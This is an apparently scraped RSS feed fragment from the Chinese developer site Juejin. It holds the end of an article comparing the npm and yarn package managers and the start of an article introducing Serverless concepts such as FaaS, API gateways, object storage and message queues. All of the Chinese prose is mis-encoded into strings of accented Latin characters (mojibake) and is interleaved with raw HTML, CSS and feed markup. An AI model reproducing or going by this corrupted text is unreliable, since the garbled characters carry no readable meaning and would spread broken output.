<p>npm åˆå­¦å®¹æ˜“ï¼Œå®‰è£…å³å¯ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-16">é€‚åˆä½¿ç”¨ yarn çš„æƒ…å†µ</h3>
<ul>
<li>å‰ç«¯å·¥ç¨‹è§„æ¨¡è¾ƒå¤§</li>
<li>ä¾èµ–æ•°é‡å¤šä¸”å®‰è£…é¢‘ç¹</li>
<li>ä»»ä½•éœ€è¦å¿«é€Ÿå®‰è£…é€Ÿåº¦çš„é¡¹ç›®</li>
<li>å¤šäººåä½œéœ€è¦æ›´ç¨³å®šçš„é”æ–‡ä»¶</li>
</ul>
<p>yarn çš„å¹¶è¡Œä¸‹è½½èƒ½åŠ›æ›´ä¼˜ç§€ï¼Œé€‚åˆå¤§å‹å‰ç«¯é¡¹ç›®ã€‚</p>
<hr/>
<h2 data-id="heading-17">ä¹ã€æ··åˆä½¿ç”¨ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h2>
<p>åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œå¦‚æœåŒæ—¶ä½¿ç”¨ npm å’Œ yarnï¼Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>ä¾èµ–è§£ææ··ä¹±</li>
<li>é”æ–‡ä»¶é‡å¤</li>
<li>node_modules å†…å®¹ä¸ä¸€è‡´</li>
</ul>
<p>å»ºè®®ï¼š</p>
<h3 data-id="heading-18">ä¸€ä¸ªé¡¹ç›®åªç”¨ä¸€ä¸ªåŒ…ç®¡ç†å™¨</h3>
<p>è¦ä¹ˆç»Ÿä¸€ç”¨ npmï¼Œè¦ä¹ˆç»Ÿä¸€ç”¨ yarnï¼Œé¿å…æ··ä¹±ã€‚</p>
<hr/>
<h2 data-id="heading-19">åã€æ€»ç»“</h2>
<p>npm ä¸ yarn æ˜¯ Node.js é¡¹ç›®æ„å»ºçš„åŸºç¡€å·¥å…·ï¼Œå®ƒä»¬çš„ä½œç”¨éƒ½æ˜¯å¸®åŠ©å¼€å‘è€…é«˜æ•ˆç®¡ç†ä¾èµ–ã€‚npm æ›´å®˜æ–¹ã€æ›´æ˜“ä¸Šæ‰‹ï¼Œè€Œ yarn æ›´å¿«é€Ÿã€æ›´é€‚åˆå¤§å‹å·¥ç¨‹ã€‚</p>
<p>æ—¥å¸¸å¼€å‘ä¸­ï¼Œåªè¦æŒæ¡ï¼š</p>
<ul>
<li>å¦‚ä½•å®‰è£…ä¾èµ–</li>
<li>å¦‚ä½•æ·»åŠ è„šæœ¬</li>
<li>å¦‚ä½•ç®¡ç†é”æ–‡ä»¶</li>
<li>å¦‚ä½•å…¨å±€ä¸æœ¬åœ°å®‰è£…å·¥å…·</li>
</ul>
<p>å°±å¯ä»¥è½»æ¾èƒœä»»å¤§å¤šæ•° Node.js é¡¹ç›®çš„ä¾èµ–ç®¡ç†å·¥ä½œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gopher å¸¦ä½ å­¦ Serverless æ¶æ„ï¼šä»æœåŠ¡å™¨è¿ç»´åˆ°æŒ‰éœ€è®¡ç®—çš„èŒƒå¼è½¬å˜]]></title>    <link>https://juejin.cn/post/7580740782933622826</link>    <guid>https://juejin.cn/post/7580740782933622826</guid>    <pubDate>2025-12-08T06:20:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580740782933622826" data-draft-id="7580723992498552868" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Gopher å¸¦ä½ å­¦ Serverless æ¶æ„ï¼šä»æœåŠ¡å™¨è¿ç»´åˆ°æŒ‰éœ€è®¡ç®—çš„èŒƒå¼è½¬å˜"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-08T06:20:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ²¡å¤šå°‘é€»è¾‘"/> <meta itemprop="url" content="https://juejin.cn/user/2717648475395325"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gopher å¸¦ä½ å­¦ Serverless æ¶æ„ï¼šä»æœåŠ¡å™¨è¿ç»´åˆ°æŒ‰éœ€è®¡ç®—çš„èŒƒå¼è½¬å˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648475395325/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ²¡å¤šå°‘é€»è¾‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:20:51.000Z" title="Mon Dec 08 2025 06:20:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶æœ‰æ—¶å€™æ˜¯å¦åŒå€¦äº†ç®¡ç†æœåŠ¡å™¨ã€é…ç½®ç¯å¢ƒã€å¤„ç†æ‰©å®¹ï¼Ÿåˆ«æ‹…å¿ƒï¼Œè¿™ç¯‡æŒ‡å—ä¸ºä½ ä»‹ç» <strong>Serverless æ¶æ„</strong>çš„æ ¸å¿ƒæ¦‚å¿µï¼Œæ‹’ç»çƒ§è„‘ï¼Œä¸»æ‰“è½»æ¾æ˜“æ‡‚ã€‚æˆ‘ä»¬å°† Serverless çš„å­¦ä¹ ä¹‹æ—…åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š<strong>ç†å¿µã€æ ¸å¿ƒæœåŠ¡ã€å®æˆ˜æ¨¡å¼</strong>ã€‚è®©æˆ‘ä»¬è·Ÿéš Gopher çš„è„šæ­¥ï¼Œä¸€èµ·æ¢ç´¢"æ— æœåŠ¡å™¨"çš„ä¸–ç•Œå§ï¼</p>
<hr/>
<h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šç†å¿µç¯‡ (The Philosophy)</h2>
<p>åœ¨å¼€å§‹å†™ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆç†è§£ Serverless çš„æœ¬è´¨ã€‚å®ƒä¸æ˜¯"æ²¡æœ‰æœåŠ¡å™¨"ï¼Œè€Œæ˜¯"ä¸ç”¨ç®¡æœåŠ¡å™¨"ã€‚</p>
<h3 data-id="heading-1">â‘  ä¸ºä»€ä¹ˆéœ€è¦ Serverless æ¶æ„ï¼Ÿ</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šServerless æ˜¯ç”¨æŒ‰éœ€è®¡ç®—å¯¹æŠ—è¿ç»´å¤æ‚æ€§çš„æ¶æ„æ–¹æ³•ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
è®©å¼€å‘è€…åªå…³æ³¨ä¸šåŠ¡ä»£ç ï¼Œè€Œå°†æœåŠ¡å™¨ç®¡ç†ã€æ‰©å®¹ã€å®¹é”™ç­‰åŸºç¡€è®¾æ–½å·¥ä½œå®Œå…¨äº¤ç»™äº‘å¹³å°ã€‚ä½ åªéœ€ä¸Šä¼ ä»£ç ï¼Œå¹³å°è‡ªåŠ¨è¿è¡Œã€æ‰©å±•å’Œè®¡è´¹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
ä¼ ç»Ÿæ¶æ„ä¸­ï¼Œå¼€å‘è€…éœ€è¦é¢„ä¼°æµé‡ã€è´­ä¹°æœåŠ¡å™¨ã€é…ç½®ç¯å¢ƒã€ç›‘æ§æ€§èƒ½ã€å¤„ç†æ‰©å®¹ã€‚è¿™äº›è¿ç»´å·¥ä½œå æ®äº†å¤§é‡æ—¶é—´ï¼Œè€Œä¸”èµ„æºåˆ©ç”¨ç‡ä½ï¼ˆé—²æ—¶æµªè´¹ï¼Œå¿™æ—¶ä¸å¤Ÿï¼‰ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3252d79240a4713ba29024e85b21c8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=qUadTRX76lTJUsSxG7GsBTAomwk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">â‘¡ FaaSï¼ˆå‡½æ•°å³æœåŠ¡ï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šFaaS æ˜¯ Serverless çš„æ ¸å¿ƒè®¡ç®—æ¨¡å‹ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å°†åº”ç”¨æ‹†åˆ†ä¸ºç‹¬ç«‹çš„å‡½æ•°ï¼ˆFunctionï¼‰ï¼Œæ¯ä¸ªå‡½æ•°å“åº”ç‰¹å®šäº‹ä»¶ï¼ˆHTTP è¯·æ±‚ã€å®šæ—¶ä»»åŠ¡ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰ï¼‰ã€‚å‡½æ•°æŒ‰éœ€æ‰§è¡Œï¼Œæ‰§è¡Œå®Œç«‹å³é‡Šæ”¾èµ„æºã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
FaaS å®ç°äº†çœŸæ­£çš„"æŒ‰éœ€è®¡ç®—"ã€‚ä½ ä¸éœ€è¦ä¸ºç©ºé—²æ—¶é—´ä»˜è´¹ï¼Œä¹Ÿä¸éœ€è¦æ‹…å¿ƒæµé‡çªå¢ï¼Œå¹³å°ä¼šè‡ªåŠ¨æ‰©å±•åˆ°æˆåƒä¸Šä¸‡ä¸ªå®ä¾‹ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c23ac66fd8994efc88ae76fbbd0a2afa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=0hz9c7i2SuUHONuVo9iC%2FjJofhk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">â‘¢ äº‹ä»¶é©±åŠ¨è§¦å‘</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šServerless å‡½æ•°ç”±äº‹ä»¶è§¦å‘æ‰§è¡Œã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
å‡½æ•°ä¸æ˜¯ä¸€ç›´è¿è¡Œçš„æœåŠ¡ï¼Œè€Œæ˜¯è¢«äº‹ä»¶å”¤é†’ï¼šHTTP è¯·æ±‚ã€æ–‡ä»¶ä¸Šä¼ ã€æ•°æ®åº“å˜æ›´ã€å®šæ—¶å™¨ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰ã€‚äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œå¹³å°è‡ªåŠ¨å¯åŠ¨å‡½æ•°å®ä¾‹å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
äº‹ä»¶é©±åŠ¨æ˜¯ Serverless çš„çµé­‚ã€‚å®ƒè®©å‡½æ•°çœŸæ­£åšåˆ°"ç”¨æ—¶å³æ¥ï¼Œç”¨å®Œå³èµ°"ï¼Œå®ç°æè‡´çš„èµ„æºåˆ©ç”¨ç‡å’Œæˆæœ¬ä¼˜åŒ–ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/993d15e620fa4d09b6e3236113f086a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=snYVJ1O8mQgqje5u2NWzHBW3tQw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">ç¬¬äºŒéƒ¨åˆ†ï¼šæ ¸å¿ƒæœåŠ¡ç¯‡ (Core Services)</h2>
<p>ç†è§£äº† Serverless çš„ç†å¿µåï¼Œæˆ‘ä»¬éœ€è¦äº†è§£æ„å»º Serverless åº”ç”¨çš„æ ¸å¿ƒæœåŠ¡ã€‚</p>
<h3 data-id="heading-5">â‘£ API ç½‘å…³ï¼ˆAPI Gatewayï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šAPI ç½‘å…³æ˜¯ Serverless åº”ç”¨çš„ç»Ÿä¸€å…¥å£ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
API ç½‘å…³æ¥æ”¶ HTTP è¯·æ±‚ï¼Œè·¯ç”±åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œå¹¶è¿”å›å“åº”ã€‚å®ƒè¿˜æä¾›è®¤è¯ã€é™æµã€ç¼“å­˜ã€æ—¥å¿—ç­‰åŠŸèƒ½ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å‡½æ•°æœ¬èº«æ²¡æœ‰å›ºå®šçš„ URLï¼ŒAPI ç½‘å…³ä¸ºå‡½æ•°æä¾›ç¨³å®šçš„ RESTful æˆ– GraphQL æ¥å£ï¼Œæ˜¯ Serverless åº”ç”¨å¯¹å¤–çš„"é—¨é¢"ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3281f89d9fdc4db3a113c6b25d273bee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=mhB1kmM2rNlUscR1Vp5QmVCJYb4%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">â‘¤ å¯¹è±¡å­˜å‚¨ï¼ˆObject Storageï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå¯¹è±¡å­˜å‚¨æ˜¯ Serverless åº”ç”¨çš„æŒä¹…åŒ–å±‚ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‘ç«¯çš„æ–‡ä»¶å­˜å‚¨æœåŠ¡ï¼ˆå¦‚ AWS S3ã€é˜¿é‡Œäº‘ OSSï¼‰ï¼Œç”¨äºå­˜å‚¨é™æ€æ–‡ä»¶ã€ç”¨æˆ·ä¸Šä¼ ã€æ—¥å¿—ç­‰ã€‚æ”¯æŒæ— é™æ‰©å±•ï¼ŒæŒ‰ä½¿ç”¨é‡è®¡è´¹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Serverless å‡½æ•°æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰§è¡Œå®Œåæ‰€æœ‰ä¸´æ—¶æ•°æ®éƒ½ä¼šä¸¢å¤±ã€‚å¯¹è±¡å­˜å‚¨æä¾›äº†å¯é ã€å»‰ä»·çš„æŒä¹…åŒ–æ–¹æ¡ˆï¼Œè€Œä¸”å¯ä»¥è§¦å‘å‡½æ•°ï¼ˆæ–‡ä»¶ä¸Šä¼ äº‹ä»¶ï¼‰ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68d82d56660b44c98665dd0ff94c64fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=89pWh8Czoyue7kBXy0HFLa2uu2Q%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">â‘¥ æ‰˜ç®¡æ•°æ®åº“ï¼ˆManaged Databaseï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šæ‰˜ç®¡æ•°æ®åº“æä¾› Serverless åŒ–çš„æ•°æ®å­˜å‚¨ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‘å¹³å°æä¾›çš„æ•°æ®åº“æœåŠ¡ï¼ˆå¦‚ DynamoDBã€Aurora Serverlessã€Firestoreï¼‰ï¼Œè‡ªåŠ¨æ‰©å±•ã€è‡ªåŠ¨å¤‡ä»½ã€æŒ‰è¯·æ±‚è®¡è´¹ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
ä¼ ç»Ÿæ•°æ®åº“éœ€è¦é¢„é…ç½®å®¹é‡ã€ç®¡ç†è¿æ¥æ± ã€å¤„ç†æ‰©å®¹ã€‚æ‰˜ç®¡æ•°æ®åº“ä¸ Serverless ç†å¿µä¸€è‡´ï¼Œè®©å¼€å‘è€…åªå…³æ³¨æ•°æ®æ¨¡å‹ï¼Œä¸å…³å¿ƒåº•å±‚è¿ç»´ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1b226f07b36448c857eb2a1705b65df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=nZDC83U%2FejpiGU0gEn4ytDl5ERM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">â‘¦ æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šæ¶ˆæ¯é˜Ÿåˆ—å®ç° Serverless å‡½æ•°é—´çš„å¼‚æ­¥é€šä¿¡ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
æ‰˜ç®¡çš„æ¶ˆæ¯æœåŠ¡ï¼ˆå¦‚ AWS SQSã€Azure Queueï¼‰ï¼Œå‡½æ•°å¯ä»¥å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ï¼Œå…¶ä»–å‡½æ•°è®¢é˜…é˜Ÿåˆ—å¹¶å¼‚æ­¥å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Serverless å‡½æ•°æœ‰æ‰§è¡Œæ—¶é—´é™åˆ¶ï¼ˆé€šå¸¸å‡ åˆ†é’Ÿï¼‰ã€‚å¯¹äºé•¿æ—¶é—´ä»»åŠ¡ï¼Œå¯ä»¥æ‹†åˆ†ä¸ºå¤šä¸ªå‡½æ•°ï¼Œé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—ä¸²è”ï¼Œå®ç°å¼‚æ­¥å·¥ä½œæµã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e331386641d54dcba39654527bff2305~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=flBqa0JQmqzAsS1uZQp5swOyMME%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">â‘§ å®šæ—¶ä»»åŠ¡ï¼ˆScheduled Tasksï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå®šæ—¶è§¦å‘å‡½æ•°æ‰§è¡Œã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
é€šè¿‡ Cron è¡¨è¾¾å¼å®šä¹‰æ‰§è¡Œè®¡åˆ’ï¼Œå¹³å°è‡ªåŠ¨åœ¨æŒ‡å®šæ—¶é—´è§¦å‘å‡½æ•°ã€‚ä¾‹å¦‚ï¼šæ¯å¤©å‡Œæ™¨ 2 ç‚¹æ‰§è¡Œæ•°æ®å¤‡ä»½ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
å¾ˆå¤šä¸šåŠ¡éœ€è¦å®šæœŸæ‰§è¡Œï¼ˆæŠ¥è¡¨ç”Ÿæˆã€æ•°æ®æ¸…ç†ã€å¥åº·æ£€æŸ¥ï¼‰ã€‚Serverless çš„å®šæ—¶ä»»åŠ¡æ— éœ€ç»´æŠ¤å¸¸é©»è¿›ç¨‹ï¼ŒæŒ‰æ‰§è¡Œæ¬¡æ•°è®¡è´¹ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0068a7a5e55e46a780c69aa1df78bff4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=mfFu7gF%2FRKz%2F4CK39v1%2BkYYFaGg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">â‘¨ æ—¥å¿—ä¸ç›‘æ§ï¼ˆLogging &amp; Monitoringï¼‰</h3>
<p><strong>ä¸€å¥è¯æ¦‚å¿µ</strong>ï¼šå¯è§‚æµ‹æ€§æ˜¯ Serverless åº”ç”¨çš„ç”Ÿå‘½çº¿ã€‚</p>
<ul>
<li>
<p><strong>å®ƒæ˜¯ä»€ä¹ˆï¼Ÿ</strong><br/>
äº‘å¹³å°è‡ªåŠ¨æ”¶é›†å‡½æ•°çš„æ—¥å¿—ã€æŒ‡æ ‡ï¼ˆæ‰§è¡Œæ—¶é—´ã€é”™è¯¯ç‡ã€å¹¶å‘æ•°ï¼‰å’Œé“¾è·¯è¿½è¸ªï¼Œæä¾›å¯è§†åŒ–ç›‘æ§é¢æ¿ã€‚</p>
</li>
<li>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</strong><br/>
Serverless å‡½æ•°æ˜¯çŸ­æš‚çš„ã€åˆ†å¸ƒå¼çš„ï¼Œä¼ ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ä¸é€‚ç”¨ã€‚æ‰˜ç®¡çš„æ—¥å¿—å’Œç›‘æ§æœåŠ¡è®©ä½ èƒ½å¤Ÿå®æ—¶äº†è§£ç³»ç»Ÿå¥åº·çŠ¶å†µï¼Œå¿«é€Ÿå®šä½é—®é¢˜ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3492a18be9249f7a770e69eafe6e596~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765779651&amp;x-signature=rW6rzdyMqPHfbqlttQKiYhDyXuE%3D" alt="image.png" loading="lazy"/></p>
